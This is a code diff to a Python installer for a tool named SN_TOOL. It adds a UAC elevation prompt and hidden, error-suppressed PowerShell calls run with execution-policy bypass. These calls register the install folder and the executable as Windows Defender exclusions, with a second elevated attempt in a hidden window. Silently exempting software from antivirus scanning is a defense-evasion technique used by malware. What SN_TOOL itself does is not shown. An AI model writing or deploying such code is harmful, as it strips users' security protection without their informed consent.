@@ -23,6 +23,31 @@ def get_default_install_dir() -> Path:
     return Path.home() / "SN_TOOL"
 
 
+def is_admin() -> bool:
+    if sys.platform != "win32":
+        return True
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+
+def request_admin_elevation():
+    """Request UAC Administrator elevation so Windows Defender whitelisting succeeds 100%."""
+    if sys.platform != "win32" or is_admin():
+        return
+    try:
+        import ctypes
+        params = " ".join([f'"{a}"' for a in sys.argv[1:]])
+        # ShellExecute with 'runas' prompts standard Windows UAC dialog
+        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        if ret > 32:
+            sys.exit(0)
+    except Exception:
+        pass
+
+
 def configure_windows_defender_exclusion(target_dir: Path):
     """
     Register Defender exclusion for SN_TOOL install path and process.
@@ -35,12 +60,24 @@ def configure_windows_defender_exclusion(target_dir: Path):
             f"Add-MpPreference -ExclusionPath '{target_dir}' -ErrorAction SilentlyContinue; "
             f"Add-MpPreference -ExclusionProcess 'SN_TOOL.exe' -ErrorAction SilentlyContinue"
         )
+        # 1. Direct attempt
         subprocess.run(
             ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
             capture_output=True,
             creationflags=0x08000000,
             timeout=5
         )
+        # 2. Elevated attempt if not running as admin
+        if not is_admin():
+            elevated_ps = (
+                f"Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"{ps_cmd}\"' -Verb RunAs -WindowStyle Hidden"
+            )
+            subprocess.run(
+                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", elevated_ps],
+                capture_output=True,
+                creationflags=0x08000000,
+                timeout=5
+            )
     except Exception:
         pass
 
@@ -79,6 +116,9 @@ def get_resource_path(relative_name: str) -> Path:
 
 
 def main():
+    # Prompt for UAC Administrator elevation if needed to whitelist in Windows Defender
+    request_admin_elevation()
+
     target_dir = get_default_install_dir()
     target_exe = target_dir / "SN_TOOL.exe"
 
